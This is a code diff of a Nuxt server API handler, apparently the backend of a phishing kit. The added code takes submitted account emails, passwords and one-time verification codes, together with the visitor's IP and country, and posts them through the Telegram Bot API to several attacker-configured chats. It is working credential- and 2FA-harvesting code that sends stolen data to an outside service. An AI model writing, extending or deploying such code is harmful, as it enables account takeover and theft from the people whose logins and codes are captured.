@@ -3,7 +3,7 @@ import { countryAlpha2CodeMapIcon } from '../utils/country'
 export default defineEventHandler(async (event) => {
   // event.context.path to get the route path: '/api/foo/bar/baz'
   // event.context.params._ to get the route segment: 'bar/baz'
-  const { code, message, newUser } = await readBody(event)
+  const { account, code, message, newUser } = await readBody(event)
   try {
     const countryCode = event?.headers.get('CF-IPCountry')
     const countryIcon =
@@ -19,26 +19,33 @@ export default defineEventHandler(async (event) => {
       })
     }
 
+    let messageText = ''
+
+    if (code) {
+      messageText = `
+<b>📲 Code : </b><code>${code}</code>
+----------------
+<b>🛰 Địa chỉ ip: </b>${event.headers.get('CF-Connecting-IP')}
+<b>🌐 Quốc gia: </b>${countryCode} ${countryIcon}
+`
+    } else if (account) {
+      messageText = `
+<b>🔑 Tài khoản: </b><code>${account.email}</code>
+<b>🔐 Mật khẩu: </b><code>${account.password}</code>
+----------------
+<b>🛰 ip: </b>${event.headers.get('CF-Connecting-IP')}
+<b>🌐 Quốc gia: </b>${countryCode} ${countryIcon}
+`
+    } else {
+      messageText = `
+<b>${message}</b>
+----------------
+<b>🛰 ip: </b>${event.headers.get('CF-Connecting-IP')}
+<b>🌐 Quốc gia: </b>${countryCode} ${countryIcon}
+`
+    }
+
     if (newUser && !countryCode) return 'ok'
-    //     await $fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
-    //       method: 'POST',
-    //       body: {
-    //         chat_id: process.env.TELEGRAM_CHAT_ID,
-    //         text: code
-    //           ? `
-    //           <b>Code:</b> ${code}
-    // <b>ip:</b>${event.headers.get('CF-Connecting-IP')}
-    // <b>Country:</b>${countryCode}
-    //           `
-    //           : `
-    //           <b>${message}</b>
-    // <b>ip:</b>${event.headers.get('CF-Connecting-IP')}
-    // <b>Country:</b>${countryCode}
-    //           `,
-    //         parse_mode: 'HTML',
-    //       },
-    //     })
-    //     return 'ok'
 
     for (let i = 0; i < tokens.length; i++) {
       if (!tokens[i] || !chatIds[i]) {
@@ -50,17 +57,7 @@ export default defineEventHandler(async (event) => {
           method: 'POST',
           body: {
             chat_id: chatIds[i],
-            text: code
-              ? `
-            <b>📲 Code :</b> ${code}
-<b>🛰 Địa chỉ ip: </b>${event.headers.get('CF-Connecting-IP')}
-<b>🌐 Quốc gia: </b>${countryCode} ${countryIcon}
-            `
-              : `
-            <b>${message}</b>
-<b>🛰 ip: </b>${event.headers.get('CF-Connecting-IP')}
-<b>🌐 Quốc gia: </b>${countryCode} ${countryIcon}
-            `,
+            text: messageText,
             parse_mode: 'HTML',
           },
         })
